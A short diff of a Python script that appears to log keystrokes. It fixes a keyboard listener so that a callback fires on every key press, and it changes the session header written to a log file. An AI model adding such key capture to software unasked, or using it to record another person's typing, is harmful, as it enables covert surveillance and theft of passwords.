@@ -53,8 +53,8 @@ def main():
         open(LOG_FILE, "w").close()
     # --
     with open(LOG_FILE, "a") as f:
-        f.write(f"\n\n--- Session initiated {datetime.datetime.now()} ---\n") 
-    with keyboard.Listener(clicking=clicking) as listener: # Set up the listener
+        f.write(f"\n** Session initiated {datetime.datetime.now()} **\n") 
+    with keyboard.Listener(on_press=clicking) as listener: # Set up the listener
         listener.join()
     # --
 if __name__ == "__main__":
